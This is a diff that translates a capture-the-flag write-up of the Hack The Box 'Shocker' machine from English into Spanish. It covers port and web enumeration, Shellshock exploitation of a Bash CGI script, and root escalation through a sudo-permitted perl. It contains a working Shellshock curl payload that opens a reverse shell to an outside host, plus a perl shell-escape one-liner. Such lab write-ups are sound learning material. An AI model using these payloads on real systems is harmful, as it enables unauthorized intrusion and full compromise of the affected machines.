@@ -1,33 +1,33 @@
-# Shocker (Easy · Linux)
+# Shocker (Easy Linux)
 
 **Author:** Ph4n3s
-**Date:** 2026-10-20
+**Fecha:** 20/10/2026
 **IP:** 10.129.78.142
-**Difficulty:** Easy / Linux
+**Dificultad:** Easy / Linux
 
 ---
 
-## 1. Enumeration
+## 1. Enumeración
 
 ### 1.1 Ping
 
-First we run a `ping -c 5 10.129.78.142`, which returns the following:
+Primero realizamos un `ping -c 5 10.129.78.142`, obteniendo lo siguiente:
 
 ```
 64 bytes from 10.129.78.142: icmp_seq=1 ttl=63 time=53.7 ms
 ```
 
-With a TTL of 63 we can guess it is a Linux machine.
+Al tener un TTL de 63 podemos intuir que es una máquina Linux.
 
-### 1.2 Open port enumeration
+### 1.2 Enumeración de puertos abiertos
 
-We use the following command:
+Utilizamos el siguiente comando:
 
 ```
 nmap -p- -open -T4 --min-rate 5000 10.129.78.142 -oN ~/HTB_machines/Shocker/ports
 ```
 
-The output was:
+El output fue el siguiente:
 
 ```
 PORT     STATE SERVICE
@@ -35,11 +35,11 @@ PORT     STATE SERVICE
 2222/tcp open  EtherNetIP-1
 ```
 
-We have an HTTP service on port 80, likely a website, and on 2222 a service identified as EtherNetIP (actually SSH running on a non-standard port, as we will see next).
+Tenemos un servicio http por el puerto 80, posiblemente una web, y en el 2222 un servicio identificado como EtherNetIP (en realidad SSH corriendo en un puerto no estándar, como veremos a continuación).
 
-### 1.3 Technology enumeration
+### 1.3 Enumeración de tecnologías
 
-To dig into the service versions we use:
+Para profundizar en las versiones de los servicios usamos:
 
 ```
 nmap -p 80,2222 -sVC --min-rate 5000 -T4 10.129.78.142 -oN ~/HTB_machines/Shocker/targeted
@@ -58,13 +58,13 @@ PORT     STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Apache 2.4.18 is a 2015/2016 release, and OpenSSH 7.2p2 is from 2016. Neither has a known direct RCE for this specific version, so we will focus on enumerating the web content before discarding anything.
+Apache 2.4.18 es una versión de 2015/2016, y OpenSSH 7.2p2 es de 2016. Ninguna de las dos tiene un RCE directo conocido para esta versión concreta, así que nos centraremos en enumerar el contenido web antes de descartar nada.
 
-Visiting `http://10.129.78.142` we find the following:
+Al visitar `http://10.129.78.142` nos encontramos con lo siguiente:
 
-![Web page on port 80](01-pagina-web.png)
+![Página web al entrar por el puerto 80](01-pagina-web.png)
 
-### 1.4 Vulnerability search with nmap scripts
+### 1.4 Búsqueda de vulnerabilidades con scripts de nmap
 
 ```
 nmap -p 80 --script vuln -Pn --min-rate 5000 10.129.78.142 -oN ~/HTB_machines/Shocker/vulns
@@ -84,7 +84,7 @@ PORT   STATE SERVICE
 |_http-csrf: Couldn't find any CSRF vulnerabilities.
 ```
 
-The only result is a possible Slowloris (DoS), which we discard: a denial of service does not give us access to the machine, and it is likely a false positive. A `searchsploit` on Apache 2.4.18 and OpenSSH 7.2p2 also returns nothing usable, so we move on to fuzzing the web content.
+El único resultado es un posible Slowloris (DoS), que descartamos: una denegación de servicio no nos da acceso a la máquina, y es probable que sea un falso positivo. Un `searchsploit` sobre Apache 2.4.18 y OpenSSH 7.2p2 tampoco arroja nada aprovechable, así que pasamos a fuzzear el contenido web.
 
 ### 1.5 Fuzzing
 
@@ -92,33 +92,33 @@ The only result is a possible Slowloris (DoS), which we discard: a denial of ser
 ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.78.142/cgi-bin/FUZZ -e .sh,.cgi,.pl -mc 200,403
 ```
 
-Relevant result:
+Resultado relevante:
 
 ```
 user.sh                 [Status: 200, Size: 118, Words: 19, Lines: 8, Duration: 67ms]
 ```
 
-We find a shell script inside `/cgi-bin/`, which indicates the server runs CGI scripts in Bash — that is the way in.
+Encontramos un script de shell dentro de `/cgi-bin/`, lo que indica que el servidor ejecuta scripts CGI en Bash — esa es la puerta de entrada.
 
 ---
 
-## 2. Exploitation
+## 2. Explotación
 
-Bash allows defining functions and storing them as environment variables so a child process can inherit them. If an environment variable starts with `() {`, Bash interprets it as a function definition — but in vulnerable versions, Bash does not stop there: it keeps reading and **executes** any command that comes after the `;`.
+Bash permite definir funciones y guardarlas como variables de entorno para que un proceso hijo pueda heredarlas. Si una variable de entorno empieza con `() {`, Bash la interpreta como definición de función — pero en las versiones vulnerables, Bash no se detiene ahí: sigue leyendo y **ejecuta** cualquier comando que venga después del `;`.
 
-This is **Shellshock** (also called BashDoor), a 2014 vulnerability (CVE-2014-6271). Since the CGI server passes HTTP headers (such as `User-Agent`) into Bash environment variables before running the script, an attacker who controls that header controls what Bash executes.
+Esto es **Shellshock** (también llamado BashDoor), una vulnerabilidad de 2014 (CVE-2014-6271). Como el servidor CGI traslada cabeceras HTTP (como `User-Agent`) a variables de entorno de Bash antes de ejecutar el script, un atacante que controle esa cabecera controla lo que Bash ejecuta.
 
-With the following command we launch the reverse shell:
+Con el siguiente comando lanzamos la reverse shell:
 
 ```
 curl -s -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.16.120/4444 0>&1" http://10.129.78.142/cgi-bin/user.sh
 ```
 
-With `nc -lvnp 4444` listening on our machine, we receive the shell as the user `shelly`.
+Con un `nc -lvnp 4444` escuchando en nuestra máquina, recibimos la shell como el usuario `shelly`.
 
-### 2.1 Privilege escalation
+### 2.1 Escalada de privilegios
 
-Once inside, we check what we can run as root:
+Una vez dentro, comprobamos qué podemos ejecutar como root:
 
 ```
 sudo -l
@@ -129,29 +129,29 @@ User shelly may run the following commands on Shocker:
     (root) NOPASSWD: /usr/bin/perl
 ```
 
-We look up `perl` on [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) and run:
+Buscamos `perl` en [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) y ejecutamos:
 
 ```
 sudo perl -e 'exec "/bin/sh"'
 ```
 
-With that we get a shell as root.
+Con eso obtenemos una shell como root.
 
-We navigate to `/root` and `cat` `root.txt`. Then to `/home/shelly` and `cat` `shelly.txt`.
+Navegamos a `/root` y hacemos `cat` a `root.txt`. Después a `/home/shelly` y `cat` a `shelly.txt`.
 
 ---
 
-## Quick summary
+## Resumen rápido
 
-**What the machine was:** an Apache web server exposing a CGI script in Bash, vulnerable to Shellshock (CVE-2014-6271).
+**Qué era la máquina:** un servidor web Apache que exponía un script CGI en Bash, vulnerable a Shellshock (CVE-2014-6271).
 
-**Enumeration:** `nmap` → ports 80 (HTTP) and 2222 (SSH) → versions with no direct RCE → fuzzing with `ffuf` on `/cgi-bin/` → `user.sh` is discovered.
+**Enumeración:** `nmap` → puertos 80 (HTTP) y 2222 (SSH) → versiones sin RCE directo → fuzzing con `ffuf` sobre `/cgi-bin/` → se descubre `user.sh`.
 
-**Exploitation:** the CGI passes the `User-Agent` header into the Bash environment. A vulnerable version of Bash executes any command placed after `() { :; };` in that variable → `curl` with malicious payload → reverse shell as `shelly`.
+**Explotación:** el CGI pasa la cabecera `User-Agent` al entorno de Bash. Una versión vulnerable de Bash ejecuta cualquier comando colocado después de `() { :; };` en esa variable → `curl` con payload malicioso → reverse shell como `shelly`.
 
-**Privilege escalation:** `sudo -l` → `shelly` can run `/usr/bin/perl` as root without a password → `sudo perl -e 'exec "/bin/sh"'` (GTFOBins) → shell as root.
+**Escalada de privilegios:** `sudo -l` → `shelly` puede ejecutar `/usr/bin/perl` como root sin contraseña → `sudo perl -e 'exec "/bin/sh"'` (GTFOBins) → shell como root.
 
-**Key concept learned:** Shellshock is not a code injection in the classic sense; it is a flaw in Bash's *parser* that confuses the end of a function definition with the end of an environment variable, executing everything that comes after it as commands.
+**Concepto clave aprendido:** Shellshock no es una inyección de código en el sentido clásico; es un fallo en el *parser* de Bash que confunde el final de una definición de función con el final de una variable de entorno, ejecutando como comandos todo lo que venga después.
 
 ---
 
